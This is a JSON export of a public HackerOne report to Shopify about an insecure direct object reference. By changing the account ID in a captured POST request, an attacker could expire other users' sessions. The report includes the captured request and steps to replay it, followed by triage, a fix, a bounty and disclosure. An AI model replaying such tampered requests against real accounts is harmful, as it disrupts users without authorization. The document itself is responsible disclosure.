{"id":56511,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81NjUxMQ==","url":"https://hackerone.com/reports/56511","title":"IDOR expire other user sessions","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-04-15T22:02:37.726Z","submitted_at":"2015-04-15T22:02:37.726Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"sappi","url":"/sappi","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/005/782/32fe1345aa01f22f810310028667835176cc05d4_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2015-04-17T01:32:54.829Z","bug_reporter_agreed_on_going_public_at":"2015-04-17T01:32:54.538Z","team_member_agreed_on_going_public_at":"2015-04-16T22:23:22.032Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi\r\n\r\nhere attacker able to expire other user session just changing the request \r\n\r\nSteps:\r\n1. Login as Attacker\r\n2. Go to account settings\r\n3. Click on expire all session and capture request \r\n4. replace account id with victim and forward \r\n5. victim account logged out\r\n\r\nrequest\r\nPOST /admin/settings/account/expire_specific_users_sessions/7641433 HTTP/1.1\r\nHost: don432.myshopify.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: https://don432.myshopify.com/admin/settings/account/7641433\r\nCookie: __utma=1.652371099.1420114739.1428608063.1429133861.3; __utmz=1.1428608063.2.2.utmcsr=app.shopify.com|utmccn=(referral)|utmcmd=referral|utmcct=/services/signup/setup; __insp_slim=1428608118179; __insp_wid=723062851; __insp_nv=true; __insp_ref=aHR0cHM6Ly9hcHAuc2hvcGlmeS5jb20vc2VydmljZXMvc2lnbnVwL3NldHVw; __insp_norec_sess=true; _ga=GA1.2.652371099.1420114739; _ab=1; storefront_digest=b4ed3ef7ad8e531a7b8ec20bf70aa78c21eebe0f4062879ce3a064bd785bc7fe; __utmb=1.15.10.1429133861; __utmc=1; _secure_admin_session_id=ddbf71351a2a38541dee544204810315; _gat=1\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 96\r\n\r\nutf8=%E2%9C%93\u0026_method=patch\u0026authenticity_token=ttrjwIKbLTYDSprUu9pAvTma%2BdxbIWn9mrjvYSb1Lok%3D\r\n\r\n\r\nin post request just change 7641433 with victim id\r\n\r\nhope you understand\r\n","vulnerability_information_html":"\u003cp\u003eHi\u003c/p\u003e\n\n\u003cp\u003ehere attacker able to expire other user session just changing the request \u003c/p\u003e\n\n\u003cp\u003eSteps:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eLogin as Attacker\u003c/li\u003e\n\u003cli\u003eGo to account settings\u003c/li\u003e\n\u003cli\u003eClick on expire all session and capture request \u003c/li\u003e\n\u003cli\u003ereplace account id with victim and forward \u003c/li\u003e\n\u003cli\u003evictim account logged out\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003erequest\u003cbr\u003e\nPOST /admin/settings/account/expire_specific_users_sessions/7641433 HTTP/1.1\u003cbr\u003e\nHost: don432.myshopify.com\u003cbr\u003e\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0\u003cbr\u003e\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,\u003cem\u003e/\u003c/em\u003e;q=0.8\u003cbr\u003e\nAccept-Language: en-US,en;q=0.5\u003cbr\u003e\nAccept-Encoding: gzip, deflate\u003cbr\u003e\nReferer: \u003ca title=\"https://don432.myshopify.com/admin/settings/account/7641433\" href=\"/redirect?url=https%3A%2F%2Fdon432.myshopify.com%2Fadmin%2Fsettings%2Faccount%2F7641433\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://don432.myshopify.com/admin/settings/account/7641433\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nCookie: __utma=1.652371099.1420114739.1428608063.1429133861.3; __utmz=1.1428608063.2.2.utmcsr=app.shopify.com|utmccn=(referral)|utmcmd=referral|utmcct=/services/signup/setup; __insp_slim=1428608118179; __insp_wid=723062851; __insp_nv=true; __insp_ref=aHR0cHM6Ly9hcHAuc2hvcGlmeS5jb20vc2VydmljZXMvc2lnbnVwL3NldHVw; __insp_norec_sess=true; _ga=GA1.2.652371099.1420114739; _ab=1; storefront_digest=b4ed3ef7ad8e531a7b8ec20bf70aa78c21eebe0f4062879ce3a064bd785bc7fe; __utmb=1.15.10.1429133861; __utmc=1; _secure_admin_session_id=ddbf71351a2a38541dee544204810315; _gat=1\u003cbr\u003e\nConnection: keep-alive\u003cbr\u003e\nContent-Type: application/x-www-form-urlencoded\u003cbr\u003e\nContent-Length: 96\u003c/p\u003e\n\n\u003cp\u003eutf8=%E2%9C%93\u0026amp;_method=patch\u0026amp;authenticity_token=ttrjwIKbLTYDSprUu9pAvTma%2BdxbIWn9mrjvYSb1Lok%3D\u003c/p\u003e\n\n\u003cp\u003ein post request just change 7641433 with victim id\u003c/p\u003e\n\n\u003cp\u003ehope you understand\u003c/p\u003e\n","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":27,"name":"Improper Authentication - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2015-05-16T22:23:22.270Z","allow_singular_disclosure_after":-177407883.9716556,"singular_disclosure_allowed":true,"vote_count":9,"voters":["shazad_sadiq","geekninja","fantam1","bb00x","abrham","rashedul_css","piawsec","lila_bard","wargsec"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":382350,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for this report. Our engineers have identified the issue and are working on a fix.","markdown_message":"\u003cp\u003eThanks for this report. Our engineers have identified the issue and are working on a fix.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-04-16T18:52:28.560Z","updated_at":"2015-04-16T18:52:28.560Z","actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":382364,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2015-04-16T18:57:21.222Z","updated_at":"2015-04-16T18:57:21.222Z","additional_data":{"duplicate_report_id":56613},"actor":{"username":"satishb3","cleared":true,"url":"/satishb3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/170/fc657d5dfd17ac30235e5687c8b2d9b461e0f64e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":382597,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We have shipped a fix for this issue. Thanks for reporting it.","markdown_message":"\u003cp\u003eWe have shipped a fix for this issue. Thanks for reporting it.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-04-16T20:54:34.782Z","updated_at":"2015-04-16T20:54:34.782Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"sappi","url":"/sappi"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":382672,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify!","markdown_message":"\u003cp\u003eThanks for helping improve the security of Shopify!\u003c/p\u003e\n","automated_response":false,"created_at":"2015-04-16T22:22:11.541Z","updated_at":"2015-04-16T22:22:11.541Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Shopify"}},"bounty_amount":"1000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"sappi","url":"/sappi"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":382677,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"@satishb3 can we make this report public?","markdown_message":"\u003cp\u003e\u003ca href=\"/satishb3\"\u003e@satishb3\u003c/a\u003e can we make this report public?\u003c/p\u003e\n","automated_response":false,"created_at":"2015-04-16T22:23:22.066Z","updated_at":"2015-04-16T22:23:22.066Z","first_to_agree":true,"actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":382811,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-04-17T01:32:54.588Z","updated_at":"2015-04-17T01:32:54.588Z","actor":{"username":"sappi","cleared":true,"url":"/sappi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/782/32fe1345aa01f22f810310028667835176cc05d4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":382812,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-04-17T01:32:54.871Z","updated_at":"2015-04-17T01:32:54.871Z","actor":{"username":"sappi","cleared":true,"url":"/sappi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/782/32fe1345aa01f22f810310028667835176cc05d4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":383631,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2015-04-17T19:50:11.483Z","updated_at":"2015-04-17T19:50:11.483Z","additional_data":{"duplicate_report_id":56895},"actor":{"username":"sculptor","cleared":false,"url":"/sculptor","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/181/aa535b4e4fedea87419366c34170cc152ea779ef_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":383752,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@francoischagnon, Check my comment on #56895, There is conflict here.","markdown_message":"\u003cp\u003e\u003ca href=\"/francoischagnon\"\u003e@francoischagnon\u003c/a\u003e, Check my comment on \u003ca href=\"/reports/56895\"\u003e#56895\u003c/a\u003e, There is conflict here.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-04-17T21:09:12.400Z","updated_at":"2015-04-17T21:09:12.400Z","actor":{"username":"sculptor","cleared":false,"url":"/sculptor","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/181/aa535b4e4fedea87419366c34170cc152ea779ef_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}